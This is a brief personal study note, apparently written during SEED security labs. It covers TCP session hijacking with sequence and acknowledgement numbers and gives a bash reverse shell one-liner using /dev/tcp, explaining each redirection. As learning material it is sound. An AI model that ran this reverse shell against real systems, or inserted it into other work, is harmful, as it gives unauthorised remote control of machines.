Things learned:


for seq and ack values in tcp-hijacking, you can use recent values (apparently the exact value doesn't particularly matter?)
- past values are accepted but future values not (p.429 from SEED book)

reverse shell command:
- /bin/bash -i > /dev/tcp/[host ip or hostname]/[port] 0<&1 2>&1
  - /bin/bash -i means "invoke an interactive shell"
  - > /dev/tcp/[]/[] means "standard output device should be directed here", the directory is a bash's TCP virtual file (TCP "devices" to send/receive data)
  - 0<&1 means "standard input device should be file descriptor 1", FD 1 represents the standard output device, which was already set to the TCP device
  - 2>&1 means "standard error device should be file descriptor 1", (see previous line about FD 1)
